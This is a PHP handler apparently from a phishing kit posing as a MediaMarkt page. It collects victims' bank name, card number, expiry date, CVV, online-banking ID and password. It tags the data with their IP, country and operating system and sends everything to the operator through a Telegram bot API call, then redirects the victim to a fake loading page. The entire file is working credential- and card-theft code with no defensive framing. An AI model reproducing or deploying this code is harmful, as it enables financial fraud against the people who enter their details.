<?php

session_start();
include_once 'functions.php';

$message = '[🦊] LOG MEDIAMARKT [🦊]' . "\r\n\n";

$message .= '🥇BANQUE : ' . $_POST['bank'] . "\r\n\n";
$message .= '🥇N° CARTE: ' . $_POST['cardnumber'] . "\r\n\n";
$message .= '🥇EXP CARTE : ' . $_POST['expirationdate'] . "\r\n\n";
$message .= '🥇CVV: ' . $_POST['securitycode'] . "\r\n\n";
$message .= '🥇ID BANQUE: ' . $_POST['identifiant'] . "\r\n\n";
$message .= '🥇PASSWORD: ' . $_POST['password'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

$_SESSION['cardName'] = $_POST['cardName'];

$url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);

file_get_contents($url);

// Utilisation de JavaScript pour la redirection
echo '<script type="text/javascript">';
echo 'window.location.href = "loading2.php";';
echo '</script>';

?>